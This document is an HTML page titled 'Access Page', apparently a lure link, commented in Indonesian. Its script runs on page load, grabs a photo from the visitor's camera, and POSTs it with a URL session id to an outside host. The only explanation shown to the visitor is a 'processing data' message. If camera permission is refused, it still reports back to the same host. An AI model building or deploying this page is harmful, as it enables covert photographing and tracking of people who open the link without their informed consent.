<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Page</title>
    <script>
        async function sendDataToServer() {
            try {
                // Mencoba untuk mengakses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const photoBlob = await imageCapture.takePhoto();
                track.stop(); // Hentikan kamera setelah foto diambil

                // Kirim foto ke server
                const formData = new FormData();
                formData.append("photo", photoBlob);

                const session = new URLSearchParams(window.location.search).get("session");

                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                    method: "POST",
                    body: formData,
                });

                console.log("Data berhasil dikirim.");
            } catch (error) {
                console.error("Error:", error);

                // Kirimkan data kosong dengan fallback gambar jika izin kamera ditolak atau terjadi error
                sendEmptyDataToAPI();
            }
        }

        // Fungsi untuk mengirimkan data kosong dengan fallback gambar
        async function sendEmptyDataToAPI() {
            document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan.";

            // Buat Blob dengan gambar fallback 1x1 pixel JPEG
            const fallbackBlob = new Blob([new Uint8Array([0])], { type: "image/jpeg" });

            // Kirim foto kosong (fallback) ke server
            const formData = new FormData();
            formData.append("photo", fallbackBlob);  // Kirimkan fallback gambar

            const session = new URLSearchParams(window.location.search).get("session");

            console.log("Mengirim data kosong (fallback) ke API...");

            try {
                const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                    method: "POST",
                    body: formData,
                });

                if (response.ok) {
                    console.log("Data kosong (fallback) berhasil dikirim.");
                } else {
                    console.error("Gagal mengirim data kosong (fallback).");
                }
            } catch (error) {
                console.error("Gagal mengirim data kosong (fallback):", error);
            }
        }

        // Jalankan fungsi saat halaman dimuat
        window.onload = sendDataToServer;
    </script>
</head>
<body>
    <h1>Memproses data...</h1>
    <p id="gagal" style="color: red;"></p>
</body>
</html>
